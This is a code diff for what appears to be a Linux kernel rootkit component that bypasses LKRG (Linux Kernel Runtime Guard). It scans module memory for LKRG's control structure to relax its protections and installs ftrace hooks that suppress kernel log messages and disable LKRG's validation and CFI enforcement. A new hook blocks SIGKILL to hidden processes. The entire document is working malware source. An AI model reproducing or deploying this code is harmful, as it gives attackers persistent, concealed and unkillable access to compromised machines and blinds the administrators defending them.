@@ -12,13 +12,6 @@ static struct notifier_block module_notifier;
 static char lkrg_log_buf[512];
 static DEFINE_SPINLOCK(lkrg_log_lock);
 
-static const char *lkrg_symbols[] = {
-    "p_ro",
-    "p_cmp_creds",
-    "p_check_integrity",
-    NULL
-};
-
 struct lkrg_ctrl_conf {
 #if defined(CONFIG_X86)
     unsigned int p_smep_validate;
@@ -64,7 +57,7 @@ static int (*set_memory_ro_fn)(unsigned long addr, int numpages);
 static void lkrg_setup_workfn(struct work_struct *work);
 static DECLARE_DELAYED_WORK(lkrg_setup_work, lkrg_setup_workfn);
 
-static notrace bool lkrg_ctrl_plausible(struct lkrg_ctrl_conf *ctrl)
+static notrace bool ctrl_ok(struct lkrg_ctrl_conf *ctrl)
 {
     if (!ctrl)
         return false;
@@ -80,23 +73,62 @@ static notrace bool lkrg_ctrl_plausible(struct lkrg_ctrl_conf *ctrl)
     return true;
 }
 
+static notrace struct lkrg_ctrl_conf *lkrg_scan_module_memory(void)
+{
+    unsigned long addr;
+    struct lkrg_ctrl_conf buf;
+    struct lkrg_ctrl_conf *found = NULL;
+    int candidates = 0;
+
+    for (addr = MODULES_VADDR; addr + sizeof(buf) <= MODULES_END; addr += PAGE_SIZE) {
+        if (copy_from_kernel_nofault(&buf, (void *)addr, sizeof(buf)) != 0)
+            continue;
+
+        if (!ctrl_ok(&buf))
+            continue;
+
+        if (buf.p_hide_lkrg != 1)
+            continue;
+
+        if (!buf.p_umh_validate && !buf.p_pint_validate && !buf.p_pcfi_validate)
+            continue;
+
+        if (buf.p_interval < 5 || buf.p_interval > 1800)
+            continue;
+
+        if (buf.p_log_level > 4)
+            continue;
+
+        candidates++;
+        found = (struct lkrg_ctrl_conf *)addr;
+
+        if (candidates > 1)
+            return NULL;
+    }
+
+    return found;
+}
+
 static notrace struct lkrg_ctrl_conf *lkrg_find_ctrl(void)
 {
-    void *ro = resolve_sym("p_ro");
+    void *ro;
     struct lkrg_ctrl_conf *ctrl;
 
-    if (!ro)
-        return NULL;
+    if (lkrg_ctrl)
+        return lkrg_ctrl;
 
-    ctrl = &((struct lkrg_ro_view *)ro)->p_lkrg_global_ctrl.ctrl;
-    if (lkrg_ctrl_plausible(ctrl))
-        return ctrl;
+    ro = resolve_sym("p_ro");
+    if (ro) {
+        ctrl = &((struct lkrg_ro_view *)ro)->p_lkrg_global_ctrl.ctrl;
+        if (ctrl_ok(ctrl))
+            return ctrl;
 
-    ctrl = (struct lkrg_ctrl_conf *)ro;
-    if (lkrg_ctrl_plausible(ctrl))
-        return ctrl;
+        ctrl = (struct lkrg_ctrl_conf *)ro;
+        if (ctrl_ok(ctrl))
+            return ctrl;
+    }
 
-    return NULL;
+    return lkrg_scan_module_memory();
 }
 
 static notrace bool lkrg_ctrl_make_rw(void *addr)
@@ -128,6 +160,7 @@ static notrace bool lkrg_relax_controls(void)
     ctrl = lkrg_find_ctrl();
     if (!ctrl)
         return false;
+
     lkrg_ctrl = ctrl;
 
     if (!ctrl->p_pint_validate && !ctrl->p_pint_enforce &&
@@ -169,17 +202,7 @@ static notrace void lkrg_restore_controls(void)
     lkrg_ctrl_make_ro(lkrg_ctrl);
 }
 
-static notrace bool is_lkrg_present(void)
-{
-    int i, found = 0;
-    for (i = 0; lkrg_symbols[i] != NULL; i++) {
-        if (resolve_sym(lkrg_symbols[i]) != NULL)
-            found++;
-    }
-    return (found >= 2);
-}
-
-static notrace bool is_lineage_hidden(struct task_struct *task)
+static notrace bool ptree_hidden(struct task_struct *task)
 {
     int depth = 0;
     struct task_struct *parent;
@@ -203,7 +226,7 @@ static notrace bool is_lineage_hidden(struct task_struct *task)
 
 static notrace bool should_hide_task(struct task_struct *task)
 {
-    return task ? is_lineage_hidden(task) : false;
+    return task ? ptree_hidden(task) : false;
 }
 
 static notrace bool should_skip_lkrg_ed(void)
@@ -286,6 +309,20 @@ static notrace asmlinkage int hook_vprintk_emit(int facility, int level,
     
     if (filter) return len;
     return orig_vprintk_emit(facility, level, dev_info, fmt, args);
+}
+
+static int (*orig_send_sig_info)(int sig, struct kernel_siginfo *info,
+    struct task_struct *p) = NULL;
+
+static notrace int hook_send_sig_info(int sig, struct kernel_siginfo *info,
+    struct task_struct *p)
+{
+    if (sig == SIGKILL && p && atomic_read(&umh_bypass_active) > 0) {
+        if (is_hidden_pid(p->tgid) || is_child_pid(p->tgid) ||
+            is_hidden_pid(p->pid)  || is_child_pid(p->pid))
+            return 0;
+    }
+    return orig_send_sig_info ? orig_send_sig_info(sig, info, p) : 0;
 }
 
 static int (*orig_call_usermodehelper_exec_async)(void *data) = NULL;
@@ -382,14 +419,15 @@ static notrace int hook_p_ed_enforce_pcfi(struct task_struct *task, void *orig,
 }
 
 static struct ftrace_hook lkrg_hooks[] = {
-    HOOK("vprintk_emit", hook_vprintk_emit, &orig_vprintk_emit),
-    HOOK("call_usermodehelper_exec_async", hook_call_usermodehelper_exec_async, &orig_call_usermodehelper_exec_async),
-    HOOK("call_usermodehelper_exec", hook_call_usermodehelper_exec, &orig_call_usermodehelper_exec),
-    HOOK("p_ed_enforce_validation", hook_p_ed_enforce_validation, &orig_p_ed_enforce_validation),
-    HOOK("p_ed_enforce_validation_paranoid", hook_p_ed_enforce_validation_paranoid, &orig_p_ed_enforce_validation_paranoid),
-    HOOK("p_ed_validate_current", hook_p_ed_validate_current, &orig_p_ed_validate_current),
-    HOOK("p_ed_validate_off_flag_wrap", hook_p_ed_validate_off_flag_wrap, &orig_p_ed_validate_off_flag_wrap),
-    HOOK("p_ed_enforce_pcfi", hook_p_ed_enforce_pcfi, &orig_p_ed_enforce_pcfi),
+    HOOK("vprintk_emit",                          hook_vprintk_emit,                      &orig_vprintk_emit),
+    HOOK("call_usermodehelper_exec_async",         hook_call_usermodehelper_exec_async,    &orig_call_usermodehelper_exec_async),
+    HOOK("call_usermodehelper_exec",               hook_call_usermodehelper_exec,          &orig_call_usermodehelper_exec),
+    HOOK("send_sig_info",                          hook_send_sig_info,                     &orig_send_sig_info),
+    HOOK("p_ed_enforce_validation",                hook_p_ed_enforce_validation,           &orig_p_ed_enforce_validation),
+    HOOK("p_ed_enforce_validation_paranoid",       hook_p_ed_enforce_validation_paranoid,  &orig_p_ed_enforce_validation_paranoid),
+    HOOK("p_ed_validate_current",                  hook_p_ed_validate_current,             &orig_p_ed_validate_current),
+    HOOK("p_ed_validate_off_flag_wrap",            hook_p_ed_validate_off_flag_wrap,       &orig_p_ed_validate_off_flag_wrap),
+    HOOK("p_ed_enforce_pcfi",                      hook_p_ed_enforce_pcfi,                 &orig_p_ed_enforce_pcfi),
 };
 
 static notrace int try_install_hooks(void)
@@ -422,9 +460,6 @@ static notrace void remove_hooks(void)
 
 static void lkrg_setup_workfn(struct work_struct *work)
 {
-    if (!is_lkrg_present())
-        return;
-
     lkrg_relax_controls();
     try_install_hooks();
     lkrg_relax_controls();
@@ -455,7 +490,7 @@ notrace void disable_umh_bypass(void)
 }
 EXPORT_SYMBOL(disable_umh_bypass);
 
-notrace bool is_lkrg_blinded(void)
+notrace bool lkrg_hooked(void)
 {
     return atomic_read(&hooks_active) > 0;
 }
@@ -465,8 +500,8 @@ notrace int lkrg_bypass_init(void)
     module_notifier.notifier_call = module_notify;
     register_module_notifier(&module_notifier);
 
-    lkrg_setup_workfn(NULL);
-    
+    try_install_hooks();
+
     return 0;
 }
 
